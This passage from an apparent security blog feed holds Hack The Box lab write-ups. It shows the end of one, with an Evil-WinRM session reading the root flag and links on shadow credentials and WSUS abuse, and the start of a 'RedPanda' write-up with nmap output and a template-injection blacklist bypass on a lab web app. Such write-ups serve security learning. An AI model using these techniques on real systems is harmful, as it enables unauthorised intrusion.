font-style: inherit;">group</span></span>
<span id="cb22-71">NT AUTHORITY\NTLM Authentication           Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-5-64-10  Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb22-72">Mandatory Label\High Mandatory Level       Label            S-1-16-12288</span>
<span id="cb22-73"></span>
<span id="cb22-74"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\Administrator\Desktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">type</span> root<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">txt</span></span>
<span id="cb22-75">a6c2f6e1b2d05b537f337ba2f8209413</span></code></pre></div>
</section>
</section>
<section id="references" class="level2">
<h2 class="anchored" data-anchor-id="references">References</h2>
<ul>
<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials" class="uri">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials</a></li>
<li><a href="https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/" class="uri">https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/</a></li>
<li><a href="https://labs.nettitude.com/blog/introducing-sharpwsus/" class="uri">https://labs.nettitude.com/blog/introducing-sharpwsus/</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment" class="uri">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment</a></li>
</ul>


</section>
</section>

 ]]></description>
  <category>hackthebox</category>
  <category>windows</category>
  <category>smtp</category>
  <category>cve-2022-30190</category>
  <category>bloodhound</category>
  <category>shadow credentials</category>
  <category>wsus</category>
  <guid>https://exploit.se/posts/2022-08-22-htb-writeup-outdated/2022-08-22-htb-writeup-outdated.html</guid>
  <pubDate>Mon, 22 Aug 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-08-22-htb-writeup-outdated/images/outdated_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>RedPanda - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-08-16-htb-writeup-redpanda/2022-08-16-htb-writeup-redpanda.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  redpanda nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.10.11.170</span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Starting</span> Nmap 7.92 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">https://nmap.org</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">at</span> 2022-08-15 20:25 CEST</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Nmap</span> scan report for 10.10.11.170</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Host</span> is up <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.032s</span> latency<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb1-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> shown: 65533 closed tcp ports <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">conn-refused</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>     STATE SERVICE</span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span>   open  ssh</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">8080/tcp</span> open  http-proxy</span>
<span id="cb1-9"></span>
<span id="cb1-10"></span>
<span id="cb1-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  redpanda nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p22,8080</span> 10.10.11.170 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--open</span></span>
<span id="cb1-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>     STATE SERVICE    VERSION</span>
<span id="cb1-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span>   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span> Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">protocol</span> 2.0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-14"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-hostkey:</span> </span>
<span id="cb1-15"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-16"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECDSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-17"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ED25519</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">8080/tcp</span> open  http-proxy</span>
<span id="cb1-19"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fingerprint-strings:</span> </span>
<span id="cb1-20"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">GetRequest:</span> </span>
<span id="cb1-21"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HTTP/1.1</span> 200 </span>
<span id="cb1-22"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Type:</span> text/html<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">charset</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>UTF-8</span>
<span id="cb1-23"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Language:</span> en-US</span>
<span id="cb1-24"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Date:</span> Mon, 15 Aug 2022 18:26:55 GMT</span>
<span id="cb1-25"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Connection:</span> close</span>
<span id="cb1-26"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>!DOCTYPE <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">html</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-27"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>html <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">lang</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"en"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">dir</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ltr"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-28"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>head<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-29"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>meta <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">charset</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"utf-8"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-30"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>meta <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">author</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"wooden_k"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-31"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>!--Codepen <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">by</span> khr2003: https://codepen.io/khr2003/pen/BGZdXw <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-32"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>link <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">rel</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"stylesheet"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">href</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"css/panda.css"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text/css"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-33"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>link <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">rel</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"stylesheet"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">href</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"css/main.css"</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text/css"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-34"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>title<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>Red <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Panda</span> Search <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Made</span> with Spring Boot<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/title<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-35"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/head<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-36"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>body<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-37"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>div <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'pande'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-38"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>div <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ear left'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>/div<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-39"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>div <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ear right'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>/div<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-40"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>div <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'whiskers left'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-41"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>span<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>/span<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-42"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>span<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>/span<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-43"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>span<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>/span<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-44"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/div<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-45"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>div <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'whiskers right'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-46"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>span<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>/span<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-47"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>span<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>/span<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-48"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>span<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&lt;</span>/span<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-49"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/div<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-50"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>div <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'face'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-51"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>div <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">class</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'eye</span></span>
<span id="cb1-52"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|   HTTPOptions: </span></span>
<span id="cb1-53"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|     HTTP/1.1 200 </span></span>
<span id="cb1-54"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|     Allow: GET,HEAD,OPTIONS</span></span>
<span id="cb1-55"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|     Content-Length: 0</span></span>
<span id="cb1-56"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|     Date: Mon, 15 Aug 2022 18:26:55 GMT</span></span>
<span id="cb1-57"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|     Connection: close</span></span>
<span id="cb1-58"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|   RTSPRequest: </span></span>
<span id="cb1-59"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|     HTTP/1.1 400 </span></span>
<span id="cb1-60"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|     Content-Type: text/html;charset=utf-8</span></span>
<span id="cb1-61"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|     Content-Language: en</span></span>
<span id="cb1-62"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|     Content-Length: 435</span></span>
<span id="cb1-63"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|     Date: Mon, 15 Aug 2022 18:26:55 GMT</span></span>
<span id="cb1-64"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|     Connection: close</span></span>
<span id="cb1-65"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|     &lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 </span></span>
<span id="cb1-66"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|     Request&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 </span></span>
<span id="cb1-67"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</span></span>
<span id="cb1-68"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|_http-title: Red Panda Search | Made with Spring Boot</span></span>
<span id="cb1-69"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">|_http-open-proxy: Proxy might be redirecting requests</span></span></code></pre></div>
<p>Visiting port 8080 we find the RedPanda search page, where we can search for different pandas.</p>
<p><img src="https://exploit.se/posts/2022-08-16-htb-writeup-redpanda/images/redpanda01.png" class="img-fluid"></p>
<p>Since this is an easy box, lets just search for something random, capture it in Burp and throw whatever we got at it; SQLi, SSTI, XXE etc.</p>
<p>With SSTI we find something interesting: <img src="https://exploit.se/posts/2022-08-16-htb-writeup-redpanda/images/redpanda02.png" class="img-fluid"> <img src="https://exploit.se/posts/2022-08-16-htb-writeup-redpanda/images/redpanda03.png" class="img-fluid"></p>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>Both <code>@(6+5)</code> and <code>#{3*3}</code> is calculated however everything starting with <code>$</code> is blacklisted.. Looking on the syntax we can figure out that the backend is java, which is also seen in the website title (<em>“Made with Spring Boot”</em>).</p>
<p>We can bypass this blacklist by replacing <code>$</code> with <code>*</code> instead, and are now able to extract some environment information:</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Request</span></span>
<span id="cb2-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">POST</span> /search HTTP/1.1</span>
<span id="cb2-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Host:</span> 10.10.11.170:8080</span>
<span id="cb2-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">User-Agent:</span> Mozilla/5.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">X11</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Linux</span> x86_64<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">rv:91.0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Gecko/20100101</span> Firefox/91.0</span>
<span id="cb2-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Accept:</span> text/html,application/xhtml+xml,application/xml<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">q</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0.9,image/webp,<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>/<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">q</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0.8</span>
<span id="cb2-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Accept-Language:</span> en-US,en<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">q</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0.5</span>
<span id="cb2-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Accept-Encoding:</span> gzip, deflate</span>
<span id="cb2-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Type:</span> application/x-www-form-urlencoded</span>
<span id="cb2-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Length:</span> 36</span>
<span id="cb2-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Origin:</span> http://10.10.11.170:8080</span>
